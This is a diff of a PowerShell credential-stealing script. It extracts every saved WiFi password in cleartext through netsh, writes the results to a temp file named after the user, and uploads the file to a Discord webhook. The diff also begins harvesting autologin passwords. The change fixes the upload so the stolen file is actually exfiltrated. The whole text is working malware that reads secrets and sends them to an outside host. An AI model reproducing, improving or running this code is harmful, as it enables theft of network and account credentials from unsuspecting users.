@@ -30,39 +30,35 @@ function Send-DiscordWebhook {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -Headers $headers
     }
     if(-not ([string]::IsNullOrEmpty($File))) {
-        # Read the file content
-        $fileBytes = [System.IO.File]::ReadAllBytes($File)
-        $fileEncoded = [System.Convert]::ToBase64String($fileBytes)
-
-        # Prepare the body as multipart/form-data
         $boundary = [System.Guid]::NewGuid().ToString()
         $LF = "`r`n"
-        $bodyLines = (
+        $fileName = [System.IO.Path]::GetFileName($File)
+        $fileContent = [System.IO.File]::ReadAllBytes($File)
+        $encodedFileContent = [System.Convert]::ToBase64String($fileContent)
+
+        $bodyLines = @(
             "--$boundary",
-            "Content-Disposition: form-data; name=`"file0`"; filename=`"$(Split-Path -Path $File -Leaf)`"",
+            "Content-Disposition: form-data; name=`"file0`"; filename=`"$fileName`"",
             "Content-Type: application/octet-stream$LF",
-            $fileEncoded,
+            $encodedFileContent,
             "--$boundary--$LF"
         ) -join $LF
 
-        # Convert the body to a byte array
         $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
 
-        # Prepare headers
         $headers = @{
             "Content-Type" = "multipart/form-data; boundary=$boundary"
         }
 
-        # Send the request
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data" -Headers $headers -Body $bodyBytes
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $bodyBytes
     }
 }
 
 # First, grab all the WiFi Password
 $FileNameWifi = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFiPasswords.txt"
 $wifiprofiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
-$wifiprofiles >> $env:TMP\$FileNameWifi
-Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -File $wifiprofiles
+$wifiprofiles >> $env:TMP\$FileNameWifi 
+Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -File $env:TMP\$FileNameWifi
 
 # Autologin password
 $FileNameAutoLogin = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_AutoLogin.txt"
